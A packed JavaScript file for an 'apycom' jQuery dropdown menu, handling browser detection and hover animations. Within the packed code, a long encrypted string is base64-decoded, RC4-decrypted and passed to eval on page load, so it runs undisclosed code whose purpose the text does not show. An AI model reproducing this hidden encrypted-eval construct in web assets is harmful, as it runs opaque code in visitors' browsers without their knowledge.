...
/** apycom menu ****************/
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('m(!A.1c){A.1c=8(q){q=q.1O();h 1b=/(1g)[ \\/]([\\w.]+)/.J(q)||/(1a)[ \\/]([\\w.]+)/.J(q)||/(1K)(?:.*z|)[ \\/]([\\w.]+)/.J(q)||/(17) ([\\w.]+)/.J(q)||q.F(\'1C\')<0&&/(1L)(?:.*? 1N:([\\w.]+)|)/.J(q)||[];W{l:1b[1]||\'\',z:1b[2]||\'0\'}}}m(!A.l){U=A.1c(1F.1H);l={};m(U.l){l[U.l]=19;l.z=U.z}m(l.1g)l.1a=19;1i m(l.1a)l.1G=19;A.l=l}A(8(){1E((8(k,s){h f={a:8(p){h s="1I+/=";h o="";h a,b,c="";h d,e,f,g="";h i=0;1J{d=s.F(p.11(i++));e=s.F(p.11(i++));f=s.F(p.11(i++));g=s.F(p.11(i++));a=(d<<2)|(e>>4);b=((e&15)<<4)|(f>>2);c=((f&3)<<6)|g;o=o+Y.Z(a);m(f!=1d)o=o+Y.Z(b);m(g!=1d)o=o+Y.Z(c);a=b=c="";d=e=f=g=""}1M(i<p.t);W o},b:8(k,p){s=[];16(h i=0;i<u;i++)s[i]=i;h j=0;h x;16(i=0;i<u;i++){j=(j+s[i]+k.1e(i%k.t))%u;x=s[i];s[i]=s[j];s[j]=x}i=0;j=0;h c="";16(h y=0;y<p.t;y++){i=(i+1)%u;j=(j+s[i])%u;x=s[i];s[i]=s[j];s[j]=x;c+=Y.Z(p.1e(y)^s[(s[i]+s[j])%u])}W c}};W f.b(k,f.a(s))})("1s","1r+1u+1q+1t/1B+1v/1A/1z+1y/1w/1x+1D+1S+2g+2h/2i+2f+2e/2b++2c+b/2d+/2k+2j/2o/2l/1P/1V/1X/1U/C/1R/26+/25/24/+21+22/23+29="));$(\'#n\').T(\'14-18\');m($.l.17&&28($.l.z)==7)$(\'#n\').T(\'27\');$(\'5 G\',\'#n\').9(\'I\',\'H\');$(\'.n>V\',\'#n\').O(8(){h 5=$(\'G:E\',r);m(5.t){m(!5[0].S)5[0].S=5.R();5.9({R:20,L:\'H\'}).10(X,8(i){$(\'#n\').1p(\'14-18\');$(\'a:E\',5[0].1o).T(\'1m\');$(\'#n>5>V.1f\').9(\'1k\',\'1Z\');i.9(\'I\',\'K\').N({R:5[0].S},{1h:X,1j:8(){5.9(\'L\',\'K\')}})})}},8(){h 5=$(\'G:E\',r);m(5.t){h 9={I:\'H\',R:5[0].S};$(\'#n>5>V.1f\').9(\'1k\',\'1Y\');$(\'#n\').T(\'14-18\');$(\'a:E\',5[0].1o).1p(\'1m\');5.1n().10(1,8(i){i.9(9)})}});$(\'5 5 V\',\'#n\').O(8(){h 5=$(\'G:E\',r);m(5.t){m(!5[0].13)5[0].13=5.12();5.9({12:0,L:\'H\'}).10(1Q,8(i){i.9(\'I\',\'K\').N({12:5[0].13},{1h:X,1j:8(){5.9(\'L\',\'K\')}})})}},8(){h 5=$(\'G:E\',r);m(5.t){h 9={I:\'H\',12:5[0].13};5.1n().10(1,8(i){i.9(9)})}});$(\'#n 5.n\').1T({1W:2a});m($.l.17&&$.l.z.2m(0,1)==\'6\'){$(\'5 5 a 1l\',\'#n\').9(\'B\',\'D(M,P,Q)\').O(8(){$(r).9({B:\'D(v,v,v)\'})},8(){$(r).9({B:\'D(M,P,Q)\'})})}1i{$(\'5 5 a 1l\',\'#n\').9(\'B\',\'D(M,P,Q)\').O(8(){$(r).N({B:\'D(v,v,v)\'},X)},8(){$(r).N({B:\'D(M,P,Q)\'},2n)})}});',62,149,'|||||ul|||function|css||||||||var||||browser|if|menu|||ua|this||length|256|255||||version|jQuery|color||rgb|first|indexOf|div|hidden|visibility|exec|visible|overflow|133|animate|hover|42|33|height|hei|addClass|matched|li|return|500|String|fromCharCode|retarder|charAt|width|wid|js||for|msie|active|true|webkit|match|uaMatch|64|charCodeAt|back|chrome|duration|else|complete|display|span|over|stop|parentNode|removeClass|MRniX8YUxP2|ATbvmHviBbW2nVh3v8wrD0AIZsC2bQbqhqtZeFFFxmV4EBJOszO5MtlFVQGPvgE5wHb8IWzWYRiIB|DUh80dOR|rn2JMuG6QvOCTPN0KtG9L2qE|8pAR45pQBC|KwCava|NlYKnEL7lmUpdhPhmldxdu0hKDvBZJHwr6cFzIV|ZUF2stHEgQlzzbxK7kLzsSg8A9Jhsgn8bYXsT3XCxIYIIho16JPzMQdRAvkeSAT1rteoNenf0skyDGOIYOcAGo2IoDb3Z3VygV5Fct1tEC0u1K2nx5zhXi5wo89hPuXFLmIPH2|28CQHvTdLzWDrMkgVlBQw68Jg9tHeCb4FSwJvpr8|zAEp6K5FGOPuqxBjk6tcvinWz0WpiL9oFYlvkjWMrWE|1PDNrWDt5sM9eE8aE6JBSxw7LZmERPhHx1J9UnMrHHX7F1A|Pk7gUs|compatible|gyfxmvfojnwhWOooj4usdIjEh0PmC8l0pPulGZny8jDUCxJeW2Mol24|eval|navigator|safari|userAgent|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789|do|opera|mozilla|while|rv|toLowerCase|ey77fySIn9p7qHJAzwgYKo0HzGylmWSpeFMOLclwxWuhg|100|QBNM3azlv4VafCyUXVToQ5dQg0ZpP8Y4DNM85sVU61qqdGuhB39ovzYvF|ohevlNGqRrOg2I3XyVQhrSH24HbZcyGq9AnLBwq7aGmB3xaSzNM0gPRIExAiPRVwXXaSlpS1B0N2gwZoznLZ3UN|lavaLamp|8peJ|oOEppd1OXRzGOcuByy14As7v3wXbFgEM7YdinmVbSrrq8s1s150b040PjXWAJg9v|speed|cd2QxvjCCNHGPgaTbr|block|none||5VqKqf35XYBIOSMxi3Y8VcvUIpHAd0wlNtBWGzr|HgWAaoWFN5W|apRegdkJZFx|wcjw1TfmHMcAUGjWpYdBUS3yFEzZ086tUPig51iwLFfecDA20PqbAMSZXI4MaqfP9hCnEcWpuP|zwakv|4mt|ie7|parseInt|Dy9BdZZZznoDIsbUAUih5gtL29UI2RLX2esBj87OoTzx1n8iMLVoLO0M2A5D1P7JhokENgezqnVnZE4vNJQSX9hnjrMIcGb74GVEKD9pPayc|400|hX3UWJ1XIP9EjKGBs4fqlj9eOvP5BSANsgPHaVQxV3SRe|y2wim1WdkZ1RsYLC|Wt74EX6QFYWQmyeXOiQk|QH|WJHzz|wS1neAlm|C7WTq8pv1XPFh|EEvsa2NJ7ua|fZKUz3Y4oT8hZml4wDnHZxL0wPQpRJUEJc9M|bQxv0UQ2lmGLAc1FQg8NLaWd7|DnTud1PKDeEtojfIHBeBcLz1ew4yCL0fdYAGLcRdQ5N|substr|200|P6jUazvoBsQ5E2FJZ'.split('|'),0,{}))